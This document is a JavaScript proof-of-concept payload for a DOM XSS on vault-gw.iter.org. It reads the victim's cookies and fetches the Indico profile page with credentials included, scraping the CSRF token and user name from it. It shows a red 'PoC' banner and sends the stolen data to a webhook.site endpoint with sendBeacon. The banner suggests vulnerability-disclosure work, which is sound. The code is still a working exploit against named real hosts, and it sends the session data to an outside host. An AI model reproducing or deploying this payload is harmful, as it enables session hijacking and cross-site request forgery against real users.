(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;

  fetch('https://indico.iter.org/user/profile/', {
    credentials: 'include'
  })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var csrfMatch = html.match(/name="csrf_token"[^>]*value="([^"]+)"/);
      var csrf = csrfMatch ? csrfMatch[1] : null;
      var titleMatch = html.match(/<title>([^<]+)<\/title>/i);
      var who = titleMatch ? titleMatch[1].trim() : null;

      report({
        chain: 'domxss-to-indico-cors',
        origin: location.origin,
        cookies: cookies,
        csrf: csrf,
        user: who
      });
    })
    .catch(function () {
      report({
        chain: 'domxss-cookie-theft',
        origin: location.origin,
        cookies: cookies
      });
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace';
    b.textContent = 'PoC: vault-gw.iter.org DOM XSS\n'
      + 'Chain: ' + ev.chain + '\n'
      + 'Origin: ' + ev.origin + '\n'
      + 'Cookies: ' + (ev.cookies || '(none)').slice(0, 80) + '\n'
      + (ev.csrf ? 'Indico CSRF: ' + ev.csrf.slice(0, 40) + '…\n' : '')
      + (ev.user ? 'Indico user: ' + ev.user + '\n' : '');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
